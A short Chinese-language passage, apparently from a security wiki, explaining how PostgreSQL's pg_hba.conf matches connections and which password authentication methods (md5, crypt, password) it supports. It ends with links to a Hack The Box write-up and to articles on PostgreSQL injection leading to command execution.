PostgreSQL 中的客户端认证通过一个名为 **pg_hba.conf** 的配置文件进行管理。该文件包含一系列记录，每条记录指定连接类型、客户端 IP 地址范围（如适用）、数据库名、用户名以及用于匹配连接的认证方法。用于认证的是第一条匹配连接类型、客户端地址、请求的数据库和用户名的记录。如果认证失败没有回退或备选机制。如果没有记录匹配，则拒绝访问。

pg_hba.conf 中可用的基于密码的认证方法有 **md5**、**crypt** 和 **password**。这些方法在密码传输方式上不同：以 MD5 散列、用 crypt 加密或明文。需要注意的是，crypt 方法不能用于在 pg_authid 中已经被加密的密码。

## References

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
